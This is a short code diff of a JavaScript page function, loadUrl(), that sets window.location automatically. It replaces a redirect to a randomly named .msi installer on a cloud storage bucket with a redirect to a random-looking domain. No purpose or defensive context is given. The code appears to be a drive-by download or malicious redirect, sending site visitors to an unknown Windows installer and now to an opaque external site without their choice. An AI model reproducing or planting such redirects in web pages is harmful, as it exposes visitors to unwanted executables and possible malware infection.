@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://psmchkfa.oss-cn-hongkong.aliyuncs.com/PsfmWdkcwsl.msi";
+		var url="https://www.yssuygdm.com";
 		window.location=url;
 	}
 }
